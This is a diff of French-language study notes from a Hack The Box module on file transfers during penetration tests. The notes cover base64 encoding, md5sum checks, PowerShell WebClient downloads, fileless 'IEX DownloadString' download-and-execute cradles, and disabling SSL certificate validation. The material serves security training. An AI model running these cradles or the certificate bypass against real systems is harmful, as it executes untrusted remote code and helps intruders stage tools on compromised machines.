@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-03-22T14:31:11.635Z
+date: 2025-03-22T14:32:14.475Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -46,16 +46,19 @@ Avec un terminal, on peut encoder un fichier en base64, copier son contenu, puis
 Il est essentiel de vérifier l'intégrité du fichier avant et après le transfert. Pour cela, on peut utiliser md5sum, qui génère et vérifie des sommes de contrôle MD5 de 128 bits.
 
 Récupérer le hash du fichier
+
 ```
 md5sum myfile
 ```
 
 Encoder le fichier en base64
+
 ```
 cat myfile | base64 -w 0; echo
 ```
 
 Une fois sur la cible, il est possible d'écrire le contenu décodé dans un fichier
+
 ```
 [IO.File]::WriteAllBytes("C:\temp\fichier", [Convert]::FromBase64String("<contenu>"))
 ```
@@ -75,9 +78,11 @@ Il est possible d'utiliser la classe PowerShell [system.net.webclient](https://l
 ### File Download
 
 Télécharger un fichier avec les méthodes DownloadFile et DownloadFileAsync:
+
 ```
 (New-Object Net.WebClient).DownloadFile('<URL>','<fichier de sortie>')
 ```
+
 ```
 (New-Object Net.WebClient).DownloadFileAsync('<URL>','<fichier de sortie>')
 ```
@@ -86,9 +91,11 @@ Télécharger un fichier avec les méthodes DownloadFile et DownloadFileAsync:
 
 Au lieu de télécharger un script PowerShell sur le disque, on peut l'exécuter directement en mémoire en utilisant la commande Invoke-Expression.
 Éxécuter un fichier (mode fileless) avec [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) et la méthode DownloadString:
+
 ```
 IEX (New-Object Net.WebClient).DownloadString('<URL>')
 ```
+
 ```
 (New-Object Net.WebClient).DownloadString('<URL>') | IEX
 ```
@@ -96,6 +103,7 @@ IEX (New-Object Net.WebClient).DownloadString('<URL>')
 ### PowerShell Invoke-WebRequest
 
 À partir de PowerShell 3.0, la commande Invoke-WebRequest (alias de curl,iwr,wget) permet de télécharger des fichiers, mais elle est relativement lente.
+
 ```
 Invoke-WebRequest <URL> -OutFile <fichier>
 ```
@@ -107,8 +115,10 @@ Une petite liste de "cradles" (technique utilisée pour télécharger et exécut
 Parfois Internet Explorer doit être lancé au moins une première fois avant d'exécuter Invoke-WebRequest.
 Pour résoudre ce problème il est possible d'utiliser l'option "-UseBasicParsing"
 
-Avec Net.WebClient, pour ne pas vérifier le certificat SSL: 
+Avec Net.WebClient, pour ne pas vérifier le certificat SSL:
+
 ```
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 ```
 
+### SMB Downloads
